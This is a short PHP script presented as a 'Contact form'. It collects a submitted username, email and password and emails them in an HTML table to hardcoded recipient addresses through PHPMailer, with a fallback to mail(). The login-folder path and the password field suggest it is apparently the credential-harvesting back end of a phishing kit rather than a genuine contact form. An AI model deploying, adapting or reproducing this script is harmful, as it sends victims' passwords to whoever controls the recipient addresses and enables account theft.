<?php
if ((isset($_POST['user'])) && (strlen(trim($_POST['user'])) > 0)) {
	$user = stripslashes(strip_tags($_POST['user']));
} else {$user = 'No name entered';}
if ((isset($_POST['email'])) && (strlen(trim($_POST['email'])) > 0)) {
	$email = stripslashes(strip_tags($_POST['email']));
} else {$email = 'No email entered';}
if ((isset($_POST['pass'])) && (strlen(trim($_POST['pass'])) > 0)) {
	$pass = stripslashes(strip_tags($_POST['pass']));
} else {$pass = 'No phone entered';}
ob_start();
?>
<html>
<head>
<style type="text/css">
</style>
</head>
<body>
<table width="550" border="1" cellspacing="2" cellpadding="2">
  <tr bgcolor="#eeffee">
    <td>Username</td>
    <td><?=$user;?></td>
  </tr>
  <tr bgcolor="#eeeeff">
    <td>Email</td>
    <td><?=$email;?></td>
  </tr>
  <tr bgcolor="#eeffee">
    <td>Password</td>
    <td><?=$pass;?></td>
  </tr>
</table>
</body>
</html>
<?
$body = ob_get_contents();

$to = $_POST['email'];
$email = 'email@example.com';
$fromaddress = $_POST['email'];
$fromname = $_POST['user'];

require("index_files/login/bin/phpmailer.php");

$mail = new PHPMailer();

$mail->From     = $email;
$mail->FromName = "Contact Form";
$mail->AddAddress("email_address@example.com","Name 1");
$mail->AddAddress("another_address@example.com","Name 2");

$mail->WordWrap = 50;
$mail->IsHTML(true);

$mail->Subject  =  "Demo Form:  Contact form submitted";
$mail->Body     =  $body;
$mail->AltBody  =  "This is the text-only body";

if(!$mail->Send()) {
	$recipient = $email;
	$subject = 'Contact form failed';
	$content = $body;	
  mail($recipient, $subject, $content, "From: mail@yourdomain.com\r\nReply-To: $email\r\nX-Mailer: DT_formmail");
  exit;
}
?>